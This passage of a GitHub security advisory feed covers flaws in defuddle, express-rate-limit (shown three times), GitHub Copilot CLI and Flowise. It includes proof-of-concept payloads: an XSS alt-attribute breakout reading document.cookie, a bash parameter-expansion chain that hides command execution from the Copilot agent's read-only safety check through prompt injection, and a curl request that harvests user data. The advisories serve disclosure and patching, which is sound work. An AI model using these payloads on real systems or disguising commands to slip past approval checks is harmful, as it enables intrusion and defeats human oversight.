</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r75-g2cr-3h76</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-06T18:45:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[defuddle] defuddle vulnerable to XSS via unescaped string interpolation in _findContentBySchemaText image tag]]></title>
        <id>https://github.com/advisories/GHSA-5mq8-78gm-pjmq</id>
        <link href="https://github.com/advisories/GHSA-5mq8-78gm-pjmq"/>
        <updated>2026-03-06T18:39:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>_findContentBySchemaText</code> method in <code>src/defuddle.ts</code> interpolates image <code>src</code> and <code>alt</code> attributes directly into an HTML string without escaping:</p>
<pre><code class="language-typescript">html += `&lt;img src="${imageSrc}" alt="${imageAlt}"&gt;`;
</code></pre>
<p>An attacker can use a <code>"</code> in the <code>alt</code> attribute to break out of the attribute context and inject event handlers. This is a separate vulnerability from the sanitization bypass fixed in f154cb7 — the injection happens during string construction, not in the DOM, so <code>_stripUnsafeElements</code> cannot catch it.</p>
<h3 id="details">Details</h3>
<p>When <code>_findContentBySchemaText</code> finds a sibling image outside the matched content element, it reads the image's <code>src</code> and <code>alt</code> attributes via <code>getAttribute()</code> and interpolates them into a template literal. <code>getAttribute('alt')</code> returns the raw attribute value. If the alt contains <code>"</code>, it terminates the <code>alt</code> attribute in the interpolated HTML string, and subsequent content becomes new attributes (including event handlers).</p>
<p>The recently added <code>_stripUnsafeElements()</code> (commit f154cb7) strips <code>on*</code> attributes from DOM elements, but the <code>alt</code> attribute's name is <code>alt</code> (not <code>on*</code>), so it is preserved with its full value. The <code>onload</code> handler is created by the string interpolation, not present in the original DOM.</p>
<h3 id="poc">PoC</h3>
<p>Input HTML:</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;PoC&lt;/title&gt;
&lt;script type="application/ld+json"&gt;
{"@type": "Article", "text": "Long article text repeated many times to exceed the extracted content word count. Long article text repeated many times to exceed the extracted content word count. Long article text repeated many times to exceed the extracted content word count."}
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;article&gt;&lt;p&gt;Short.&lt;/p&gt;&lt;/article&gt;
&lt;div class="post-container"&gt;
  &lt;p&gt;Extra text to inflate parent word count padding padding padding.&lt;/p&gt;
  &lt;div class="post-body"&gt;
    Long article text repeated many times to exceed the extracted content word count. Long article text repeated many times to exceed the extracted content word count. Long article text repeated many times to exceed the extracted content word count.
  &lt;/div&gt;
  &lt;img width="800" height="600" src="https://example.com/photo.jpg" alt='pwned" onload="alert(document.cookie)'&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>Output:</p>
<pre><code class="language-html">&lt;img src="https://example.com/photo.jpg" alt="pwned" onload="alert(document.cookie)"&gt;
</code></pre>
<p>The <code>onload</code> event handler is injected as a separate HTML attribute.</p>
<h3 id="impact">Impact</h3>
<p>XSS in any application that renders defuddle's HTML output (browser extensions, web clippers, reader modes). The attack requires crafted HTML with schema.org structured data that triggers the <code>_findContentBySchemaText</code> fallback, combined with a sibling image whose <code>alt</code> attribute contains a quote character followed by an event handler.</p>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Use DOM API instead of string interpolation:</p>
<pre><code class="language-typescript">if (imageSrc) {
    const img = this.doc.createElement('img');
    img.setAttribute('src', imageSrc);
    img.setAttribute('alt', imageAlt);
    html += img.outerHTML;
}
</code></pre>
<p>This ensures attribute values are properly escaped by the DOM serializer.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kepano/defuddle/security/advisories/GHSA-5mq8-78gm-pjmq">https://github.com/kepano/defuddle/security/advisories/GHSA-5mq8-78gm-pjmq</a></li>
<li><a href="https://github.com/kepano/defuddle/commit/f154cb740ee603431b69638273af737a27156df9">https://github.com/kepano/defuddle/commit/f154cb740ee603431b69638273af737a27156df9</a></li>
<li><a href="https://github.com/advisories/GHSA-5mq8-78gm-pjmq">https://github.com/advisories/GHSA-5mq8-78gm-pjmq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5mq8-78gm-pjmq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-06T18:39:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[express-rate-limit] express-rate-limit: IPv4-mapped IPv6 addresses bypass per-client rate limiting on servers with dual-stack network]]></title>
        <id>https://github.com/advisories/GHSA-46wh-pxpv-q5gq</id>
        <link href="https://github.com/advisories/GHSA-46wh-pxpv-q5gq"/>
        <updated>2026-03-06T18:36:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The default <code>keyGenerator</code> in express-rate-limit applies IPv6 subnet masking (<code>/56</code> by default) to all addresses that <code>net.isIPv6()</code> returns true for. This includes IPv4-mapped IPv6 addresses (<code>::ffff:x.x.x.x</code>), which Node.js returns as <code>request.ip</code> on dual-stack servers.</p>
<p>Because the first 80 bits of all IPv4-mapped addresses are zero, a <code>/56</code> (or any <code>/32</code> to <code>/80</code>) subnet mask produces the same network key (<code>::/56</code>) for <strong>every</strong> IPv4 client. This collapses all IPv4 traffic into a single rate-limit bucket: one client exhausting the limit causes HTTP 429 for all other IPv4 clients.</p>
<h2 id="details">Details</h2>
<h3 id="root-cause">Root Cause</h3>
<p>In <code>source/ip-key-generator.ts</code>:</p>
<pre><code class="language-typescript">export function ipKeyGenerator(ip: string, ipv6Subnet: number | false = 56) {
  if (ipv6Subnet &amp;&amp; isIPv6(ip)) {
    return `${new Address6(`${ip}/${ipv6Subnet}`).startAddress().correctForm()}/${ipv6Subnet}`
  }
  return ip
}
</code></pre>
<p><code>net.isIPv6('::ffff:192.168.1.1')</code> returns <code>true</code>, so IPv4-mapped addresses enter the subnet masking path. With a <code>/56</code> prefix, the start address for any <code>::ffff:x.x.x.x</code> is <code>::</code>, producing the key <code>::/56</code>.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<pre><code class="language-javascript">const { isIPv6 } = require('net');
const { Address6 } = require('ip-address');

function ipKeyGenerator(ip, ipv6Subnet = 56) {
  if (ipv6Subnet &amp;&amp; isIPv6(ip)) {
    return `${new Address6(`${ip}/${ipv6Subnet}`).startAddress().correctForm()}/${ipv6Subnet}`;
  }
  return ip;
}

console.log(ipKeyGenerator('::ffff:192.168.1.1', 56)); // ::/56
console.log(ipKeyGenerator('::ffff:10.0.0.1', 56));    // ::/56
console.log(ipKeyGenerator('::ffff:8.8.8.8', 56));     // ::/56
// ALL produce '::/56' — same bucket
</code></pre>
<h3 id="end-to-end-validation">End-to-End Validation</h3>
<p>On a dual-stack Express server (<code>app.listen(port, '::')</code>), tested with Express 5.2.1:</p>
<ul>
<li><code>request.ip</code> for IPv4 clients is <code>::ffff:127.0.0.1</code></li>
<li>Rate limit key resolves to <code>::/56</code></li>
<li>After <code>limit</code> requests from any IPv4 client, all other IPv4 clients receive 429</li>
</ul>
<h3 id="when-this-occurs">When This Occurs</h3>
<ul>
<li>Node.js dual-stack servers (default on Linux when listening on <code>::</code>)</li>
<li>Any environment where <code>request.ip</code> contains IPv4-mapped IPv6 addresses</li>
<li>Only affects the default <code>keyGenerator</code> (custom key generators are not affected)</li>
</ul>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Denial of Service</strong>: A single client can block all IPv4 traffic by exhausting the shared rate limit</li>
<li><strong>Affects default configuration</strong>: No special options needed to trigger this</li>
</ul>
<h2 id="affected-versions">Affected Versions</h2>
<p>All versions of express-rate-limit between v8.0.0 and v8.2.1.</p>
<h2 id="fix">Fix</h2>
<p>This issue was fixed in commit 14e53888cdfd1b9798faf5b634c4206409e27fc4. This fix has been included in release v8.3.0, and backported to all affected minor versions in the form of releases v8.2.2, v8.1.1, and v8.0.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/express-rate-limit/express-rate-limit/security/advisories/GHSA-46wh-pxpv-q5gq">https://github.com/express-rate-limit/express-rate-limit/security/advisories/GHSA-46wh-pxpv-q5gq</a></li>
<li><a href="https://github.com/express-rate-limit/express-rate-limit/commit/14e53888cdfd1b9798faf5b634c4206409e27fc4">https://github.com/express-rate-limit/express-rate-limit/commit/14e53888cdfd1b9798faf5b634c4206409e27fc4</a></li>
<li><a href="https://github.com/advisories/GHSA-46wh-pxpv-q5gq">https://github.com/advisories/GHSA-46wh-pxpv-q5gq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-46wh-pxpv-q5gq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-06T18:36:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[express-rate-limit] express-rate-limit: IPv4-mapped IPv6 addresses bypass per-client rate limiting on servers with dual-stack network]]></title>
        <id>https://github.com/advisories/GHSA-46wh-pxpv-q5gq</id>
        <link href="https://github.com/advisories/GHSA-46wh-pxpv-q5gq"/>
        <updated>2026-03-06T18:36:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The default <code>keyGenerator</code> in express-rate-limit applies IPv6 subnet masking (<code>/56</code> by default) to all addresses that <code>net.isIPv6()</code> returns true for. This includes IPv4-mapped IPv6 addresses (<code>::ffff:x.x.x.x</code>), which Node.js returns as <code>request.ip</code> on dual-stack servers.</p>
<p>Because the first 80 bits of all IPv4-mapped addresses are zero, a <code>/56</code> (or any <code>/32</code> to <code>/80</code>) subnet mask produces the same network key (<code>::/56</code>) for <strong>every</strong> IPv4 client. This collapses all IPv4 traffic into a single rate-limit bucket: one client exhausting the limit causes HTTP 429 for all other IPv4 clients.</p>
<h2 id="details">Details</h2>
<h3 id="root-cause">Root Cause</h3>
<p>In <code>source/ip-key-generator.ts</code>:</p>
<pre><code class="language-typescript">export function ipKeyGenerator(ip: string, ipv6Subnet: number | false = 56) {
  if (ipv6Subnet &amp;&amp; isIPv6(ip)) {
    return `${new Address6(`${ip}/${ipv6Subnet}`).startAddress().correctForm()}/${ipv6Subnet}`
  }
  return ip
}
</code></pre>
<p><code>net.isIPv6('::ffff:192.168.1.1')</code> returns <code>true</code>, so IPv4-mapped addresses enter the subnet masking path. With a <code>/56</code> prefix, the start address for any <code>::ffff:x.x.x.x</code> is <code>::</code>, producing the key <code>::/56</code>.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<pre><code class="language-javascript">const { isIPv6 } = require('net');
const { Address6 } = require('ip-address');

function ipKeyGenerator(ip, ipv6Subnet = 56) {
  if (ipv6Subnet &amp;&amp; isIPv6(ip)) {
    return `${new Address6(`${ip}/${ipv6Subnet}`).startAddress().correctForm()}/${ipv6Subnet}`;
  }
  return ip;
}

console.log(ipKeyGenerator('::ffff:192.168.1.1', 56)); // ::/56
console.log(ipKeyGenerator('::ffff:10.0.0.1', 56));    // ::/56
console.log(ipKeyGenerator('::ffff:8.8.8.8', 56));     // ::/56
// ALL produce '::/56' — same bucket
</code></pre>
<h3 id="end-to-end-validation">End-to-End Validation</h3>
<p>On a dual-stack Express server (<code>app.listen(port, '::')</code>), tested with Express 5.2.1:</p>
<ul>
<li><code>request.ip</code> for IPv4 clients is <code>::ffff:127.0.0.1</code></li>
<li>Rate limit key resolves to <code>::/56</code></li>
<li>After <code>limit</code> requests from any IPv4 client, all other IPv4 clients receive 429</li>
</ul>
<h3 id="when-this-occurs">When This Occurs</h3>
<ul>
<li>Node.js dual-stack servers (default on Linux when listening on <code>::</code>)</li>
<li>Any environment where <code>request.ip</code> contains IPv4-mapped IPv6 addresses</li>
<li>Only affects the default <code>keyGenerator</code> (custom key generators are not affected)</li>
</ul>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Denial of Service</strong>: A single client can block all IPv4 traffic by exhausting the shared rate limit</li>
<li><strong>Affects default configuration</strong>: No special options needed to trigger this</li>
</ul>
<h2 id="affected-versions">Affected Versions</h2>
<p>All versions of express-rate-limit between v8.0.0 and v8.2.1.</p>
<h2 id="fix">Fix</h2>
<p>This issue was fixed in commit 14e53888cdfd1b9798faf5b634c4206409e27fc4. This fix has been included in release v8.3.0, and backported to all affected minor versions in the form of releases v8.2.2, v8.1.1, and v8.0.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/express-rate-limit/express-rate-limit/security/advisories/GHSA-46wh-pxpv-q5gq">https://github.com/express-rate-limit/express-rate-limit/security/advisories/GHSA-46wh-pxpv-q5gq</a></li>
<li><a href="https://github.com/express-rate-limit/express-rate-limit/commit/14e53888cdfd1b9798faf5b634c4206409e27fc4">https://github.com/express-rate-limit/express-rate-limit/commit/14e53888cdfd1b9798faf5b634c4206409e27fc4</a></li>
<li><a href="https://github.com/advisories/GHSA-46wh-pxpv-q5gq">https://github.com/advisories/GHSA-46wh-pxpv-q5gq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-46wh-pxpv-q5gq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-06T18:36:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[express-rate-limit] express-rate-limit: IPv4-mapped IPv6 addresses bypass per-client rate limiting on servers with dual-stack network]]></title>
        <id>https://github.com/advisories/GHSA-46wh-pxpv-q5gq</id>
        <link href="https://github.com/advisories/GHSA-46wh-pxpv-q5gq"/>
        <updated>2026-03-06T18:36:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The default <code>keyGenerator</code> in express-rate-limit applies IPv6 subnet masking (<code>/56</code> by default) to all addresses that <code>net.isIPv6()</code> returns true for. This includes IPv4-mapped IPv6 addresses (<code>::ffff:x.x.x.x</code>), which Node.js returns as <code>request.ip</code> on dual-stack servers.</p>
<p>Because the first 80 bits of all IPv4-mapped addresses are zero, a <code>/56</code> (or any <code>/32</code> to <code>/80</code>) subnet mask produces the same network key (<code>::/56</code>) for <strong>every</strong> IPv4 client. This collapses all IPv4 traffic into a single rate-limit bucket: one client exhausting the limit causes HTTP 429 for all other IPv4 clients.</p>
<h2 id="details">Details</h2>
<h3 id="root-cause">Root Cause</h3>
<p>In <code>source/ip-key-generator.ts</code>:</p>
<pre><code class="language-typescript">export function ipKeyGenerator(ip: string, ipv6Subnet: number | false = 56) {
  if (ipv6Subnet &amp;&amp; isIPv6(ip)) {
    return `${new Address6(`${ip}/${ipv6Subnet}`).startAddress().correctForm()}/${ipv6Subnet}`
  }
  return ip
}
</code></pre>
<p><code>net.isIPv6('::ffff:192.168.1.1')</code> returns <code>true</code>, so IPv4-mapped addresses enter the subnet masking path. With a <code>/56</code> prefix, the start address for any <code>::ffff:x.x.x.x</code> is <code>::</code>, producing the key <code>::/56</code>.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<pre><code class="language-javascript">const { isIPv6 } = require('net');
const { Address6 } = require('ip-address');

function ipKeyGenerator(ip, ipv6Subnet = 56) {
  if (ipv6Subnet &amp;&amp; isIPv6(ip)) {
    return `${new Address6(`${ip}/${ipv6Subnet}`).startAddress().correctForm()}/${ipv6Subnet}`;
  }
  return ip;
}

console.log(ipKeyGenerator('::ffff:192.168.1.1', 56)); // ::/56
console.log(ipKeyGenerator('::ffff:10.0.0.1', 56));    // ::/56
console.log(ipKeyGenerator('::ffff:8.8.8.8', 56));     // ::/56
// ALL produce '::/56' — same bucket
</code></pre>
<h3 id="end-to-end-validation">End-to-End Validation</h3>
<p>On a dual-stack Express server (<code>app.listen(port, '::')</code>), tested with Express 5.2.1:</p>
<ul>
<li><code>request.ip</code> for IPv4 clients is <code>::ffff:127.0.0.1</code></li>
<li>Rate limit key resolves to <code>::/56</code></li>
<li>After <code>limit</code> requests from any IPv4 client, all other IPv4 clients receive 429</li>
</ul>
<h3 id="when-this-occurs">When This Occurs</h3>
<ul>
<li>Node.js dual-stack servers (default on Linux when listening on <code>::</code>)</li>
<li>Any environment where <code>request.ip</code> contains IPv4-mapped IPv6 addresses</li>
<li>Only affects the default <code>keyGenerator</code> (custom key generators are not affected)</li>
</ul>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Denial of Service</strong>: A single client can block all IPv4 traffic by exhausting the shared rate limit</li>
<li><strong>Affects default configuration</strong>: No special options needed to trigger this</li>
</ul>
<h2 id="affected-versions">Affected Versions</h2>
<p>All versions of express-rate-limit between v8.0.0 and v8.2.1.</p>
<h2 id="fix">Fix</h2>
<p>This issue was fixed in commit 14e53888cdfd1b9798faf5b634c4206409e27fc4. This fix has been included in release v8.3.0, and backported to all affected minor versions in the form of releases v8.2.2, v8.1.1, and v8.0.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/express-rate-limit/express-rate-limit/security/advisories/GHSA-46wh-pxpv-q5gq">https://github.com/express-rate-limit/express-rate-limit/security/advisories/GHSA-46wh-pxpv-q5gq</a></li>
<li><a href="https://github.com/express-rate-limit/express-rate-limit/commit/14e53888cdfd1b9798faf5b634c4206409e27fc4">https://github.com/express-rate-limit/express-rate-limit/commit/14e53888cdfd1b9798faf5b634c4206409e27fc4</a></li>
<li><a href="https://github.com/advisories/GHSA-46wh-pxpv-q5gq">https://github.com/advisories/GHSA-46wh-pxpv-q5gq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-46wh-pxpv-q5gq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-06T18:36:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@github/copilot] GitHub Copilot CLI Dangerous Shell Expansion Patterns Enable Arbitrary Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-g8r9-g2v8-jv6f</id>
        <link href="https://github.com/advisories/GHSA-g8r9-g2v8-jv6f"/>
        <updated>2026-03-06T16:50:16.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A security vulnerability has been identified in GitHub Copilot CLI's shell tool that could allow arbitrary code execution through crafted bash parameter expansion patterns. An attacker who can influence the commands executed by the agent (e.g., via prompt injection through repository files, MCP server responses, or user instructions) can exploit bash parameter transformation operators to execute hidden commands, bypassing the safety assessment that classifies commands as "read-only."</p>
<h2 id="details">Details</h2>
<p>The vulnerability stems from how the CLI's shell safety assessment evaluates commands before execution. The safety layer parses and classifies shell commands as either read-only (safe) or write-capable (requires user approval). However, several bash parameter expansion features can embed executable code within arguments to otherwise read-only commands, causing them to appear safe while actually performing arbitrary operations.</p>
<p>The specific dangerous patterns are:</p>
<ol>
<li><p><strong><code>${var@P}</code> — Prompt expansion:</strong> The <code>@P</code> parameter transformation operator evaluates its value as a prompt string, which interprets embedded command substitutions. This allows hidden command execution inside what appears to be a simple variable reference.</p>
</li>
<li><p><strong><code>${var=value}</code> / <code>${var:=value}</code> — Assignment side-effects:</strong> These forms assign values to variables as a side-effect of expansion. When chained with <code>@P</code>, an attacker can progressively build up a command substitution string across multiple expansions.</p>
</li>
<li><p><strong><code>${!var}</code> — Indirect expansion:</strong> Dereferences an arbitrary variable name, which can be combined with other patterns to construct and execute commands dynamically.</p>
</li>
<li><p><strong>Nested <code>$(cmd)</code> or <code>&lt;(cmd)</code> inside <code>${...}</code> expansions:</strong> Command substitution or process substitution embedded within parameter expansion default values (e.g., <code>${HOME:-$(whoami)}</code>) executes the nested command.</p>
</li>
</ol>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>The following command appears to run a harmless <code>echo</code>, but actually executes <code>touch /tmp/pwned</code> through chained parameter expansion:</p>
<pre><code class="language-bash">echo ${a="$"}${b="$a(touch /tmp/pwned)"}${b@P}
</code></pre>
<p><strong>How it works:</strong></p>
<ul>
<li><code>${a="$"}</code> assigns the literal <code>$</code> character to variable <code>a</code></li>
<li><code>${b="$a(touch /tmp/pwned)"}</code> expands <code>$a</code> to <code>$</code>, constructing the string <code>$(touch /tmp/pwned)</code> and assigning it to <code>b</code></li>
<li><code>${b@P}</code> applies prompt expansion to <code>b</code>, which evaluates the embedded <code>$(touch /tmp/pwned)</code> command substitution</li>
</ul>
<p>Prior to the fix, the safety assessment would classify <code>echo</code> as a read-only command and allow execution without user confirmation — even in modes that normally require approval for write operations.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can influence command text sent to the shell tool — for example, through:</p>
<ul>
<li>Prompt injection via malicious repository content (README files, code comments, issue bodies)</li>
<li>Compromised or malicious MCP server responses</li>
<li>Crafted user instructions containing obfuscated commands</li>
</ul>
<p>— could achieve arbitrary code execution on the user's workstation. This is possible even in permission modes that require user approval for write operations, since the commands can appear to be using only read-only utilities to ultimately trigger write operations.</p>
<p>Successful exploitation could lead to data exfiltration, file modification, or further system compromise.</p>
<h2 id="affected-versions">Affected Versions</h2>
<ul>
<li>GitHub Copilot CLI versions prior to 0.0.423</li>
</ul>
<h2 id="remediation-and-mitigation">Remediation and Mitigation</h2>
<h3 id="fix">Fix</h3>
<p>The fix adds two layers of defense:</p>
<ol>
<li><p><strong>Parse-time detection:</strong> The shell safety assessment analyzes <code>${...}</code> expansion nodes within bash commands, detecting dangerous operators (<code>@P</code>, <code>=</code>, <code>:=</code>, <code>!</code>) and nested command/process substitutions. Commands containing these patterns are downgraded from read-only to write-capable, ensuring they require user approval.</p>
</li>
<li><p><strong>Unconditional blocking:</strong> Commands with dangerous expansion patterns are unconditionally blocked at the tool execution layer — regardless of permission mode (including <code>--yolo</code> / autopilot). This prevents exploitation even when all commands are auto-approved.</p>
</li>
<li><p><strong>System prompt hardening:</strong> The bash shell tool's system prompt now includes explicit instructions for the LLM to refuse executing commands with these patterns, providing a defense-in-depth layer.</p>
</li>
</ol>
<h3 id="user-actions">User Actions</h3>
<ol>
<li><strong>Upgrade</strong> GitHub Copilot CLI to <strong>0.0.423</strong> or later.</li>
<li><strong>Exercise caution</strong> when working in untrusted repositories or with untrusted MCP servers.</li>
<li><strong>Review</strong> any shell commands suggested by the agent that contain complex parameter expansion patterns.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/github/copilot-cli/security/advisories/GHSA-g8r9-g2v8-jv6f">https://github.com/github/copilot-cli/security/advisories/GHSA-g8r9-g2v8-jv6f</a></li>
<li><a href="https://github.com/github/copilot-cli/releases/tag/v0.0.423">https://github.com/github/copilot-cli/releases/tag/v0.0.423</a></li>
<li><a href="https://github.com/advisories/GHSA-g8r9-g2v8-jv6f">https://github.com/advisories/GHSA-g8r9-g2v8-jv6f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g8r9-g2v8-jv6f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-06T16:43:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise Vulnerable to PII Disclosure on Unauthenticated Forgot Password Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-jc5m-wrp2-qq38</id>
        <link href="https://github.com/advisories/GHSA-jc5m-wrp2-qq38"/>
        <updated>2026-03-05T21:58:03.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>/api/v1/account/forgot-password</code> endpoint returns the full user object including PII (id, name, email, status, timestamps) in the response body instead of a generic success message. This exposes sensitive user information to unauthenticated attackers who only need to know a valid email address.</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>CWE</td>
<td>CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</td>
</tr>
<tr>
<td>Affected File</td>
<td><code>packages/server/src/enterprise/services/account.service.ts</code> (lines 517-545)</td>
</tr>
<tr>
<td>Endpoint</td>
<td><code>POST /api/v1/account/forgot-password</code></td>
</tr>
<tr>
<td>Authentication</td>
<td>None required</td>
</tr>
<tr>
<td>CVSS 3.1</td>
<td>3.7 (Low)</td>
</tr>
</tbody></table>
<h2 id="root-cause">Root Cause</h2>
<p>In <code>account.service.ts</code>, the <code>forgotPassword</code> method returns the sanitized user object instead of a simple success acknowledgment:</p>
<pre><code class="language-typescript">public async forgotPassword(data: AccountDTO) {
    // ...
    const user = await this.userService.readUserByEmail(data.user.email, queryRunner)
    if (!user) throw new InternalFlowiseError(StatusCodes.NOT_FOUND, UserErrorMessage.USER_NOT_FOUND)

    data.user = user
    // ... password reset logic ...

    return sanitizeUser(data.user)  // Returns user object with PII
}
</code></pre>
<p>The <code>sanitizeUser</code> function only removes sensitive authentication fields:</p>
<pre><code class="language-typescript">export function sanitizeUser(user: Partial&lt;User&gt;) {
    delete user.credential    // password hash
    delete user.tempToken     // reset token
    delete user.tokenExpiry

    return user  // Still contains: id, name, email, status, createdDate, updatedDate
}
</code></pre>
<h2 id="impact">Impact</h2>
<p>An unauthenticated attacker can:</p>
<ol>
<li><strong>Harvest PII</strong>: Collect user IDs, full names, and account metadata</li>
<li><strong>Profile users</strong>: Determine account creation dates and activity patterns</li>
<li><strong>Enumerate accounts</strong>: Confirm email existence and gather associated data</li>
<li><strong>Enable further attacks</strong>: Use harvested data for social engineering or targeted phishing</li>
</ol>
<h2 id="exploitation">Exploitation</h2>
<pre><code class="language-bash">curl -X POST "https://cloud.flowiseai.com/api/v1/account/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"victim@example.com"}}'
</code></pre>
<h3 id="evidence">Evidence</h3>
<p><strong>Request:</strong></p>
<pre><code class="language-http">POST /api/v1/account/forgot-password HTTP/1.1
Host: cloud.flowiseai.com
Content-Type: application/json

{"user":{"email":"vefag54010@naprb.com"}}
</code></pre>
<p><strong>Response (201 Created):</strong></p>
<pre><code class="language-json">{
    "id": "56c3fc72-4e85-49c9-a4b5-d1a46b373a12",
    "name": "Vefag naprb",
    "email": "vefag54010@naprb.com",
    "status": "active",
    "createdDate": "2026-01-17T15:21:59.152Z",
    "updatedDate": "2026-01-17T15:35:06.492Z",
    "createdBy": "56c3fc72-4e85-49c9-a4b5-d1a46b373a12",
    "updatedBy": "56c3fc72-4e85-49c9-a4b5-d1a46b373a12"
}
</code></pre>
<img src="https://github.com/user-attachments/assets/9880f037-6e21-41d7-a7c8-7057c6775b50" alt="screenshot" height="791" width="1582">

<h2 id="exposed-data">Exposed Data</h2>
<table>
<thead>
<tr>
<th>Field</th>
<th>Risk</th>
</tr>
</thead>
<tbody><tr>
<td><code>id</code></td>
<td>Internal user UUID - enables targeted attacks</td>
</tr>
<tr>
<td><code>name</code></td>
<td>Full name - PII disclosure</td>
</tr>
<tr>
<td><code>email</code></td>
<td>Email confirmation</td>
</tr>
<tr>
<td><code>status</code></td>
<td>Account state information</td>
</tr>
<tr>
<td><code>createdDate</code></td>
<td>User profiling</td>
</tr>
<tr>
<td><code>updatedDate</code></td>
<td>Activity tracking</td>
</tr>
<tr>
<td><code>createdBy</code> / <code>updatedBy</code></td>
<td>Internal reference leak</td>
</tr>
</tbody></table>
<h2 id="expected-behavior">Expected Behavior</h2>
<p>A secure forgot-password endpoint should return a generic response regardless of whether the email exists:</p>
<pre><code class="language-json">{"message": "If this email exists, a password reset link has been sent."}
</code></pre>
<h2 id="references">References</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Exposure of Sensitive Information</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#password-recovery">OWASP Authentication Cheat Sheet</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-jc5m-wrp2-qq38">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-jc5m-wrp2-qq38</a></li>
<li><a href="https://github.com/advisories/GHSA-jc5m-wrp2-qq38">https://github.com/advisories/GHSA-jc5m-wrp2-qq38</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jc5m-wrp2-qq38</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-05T21:58:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise has Insufficient Password Salt Rounds]]></title>
        <id>https://github.com/advisories/GHSA-x2g5-fvc2-gqvp</id>
        <link href="https://github.com/advisories/GHSA-x2g5-fvc2-gqvp"/>
        <updated>2026-03-05T21:54:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>The default bcrypt salt rounds is set to 5, which is below the recommended minimum for security.</p>
<h3 id="affected-code">Affected Code</h3>
<pre><code>export function getHash(value: string) {
    const salt = bcrypt.genSaltSync(parseInt(process.env.PASSWORD_SALT_HASH_ROUNDS || '5'))
    return bcrypt.hashSync(value, salt)
}
</code></pre>
<h3 id="evidence">Evidence</h3>
<p>Using 5 salt rounds provides 2^5 = 32 iterations, which is far below the OWASP recommendation of 10 (2^10 = 1024 iterations) for bcrypt. This makes password hashes vulnerable to brute-force attacks with modern hardware.</p>
<h3 id="impact">Impact</h3>
<p>Faster password cracking - in the event of database compromise, attackers can crack password hashes significantly faster than with proper salt rounds, potentially compromising all user accounts.</p>
<h3 id="recommendation">Recommendation</h3>
<p>Increase default PASSWORD_SALT_HASH_ROUNDS to at least 10 (recommended by OWASP). Consider using 12 for better security-performance balance. Document that higher values increase login time but improve security.</p>
<h3 id="notes">Notes</h3>
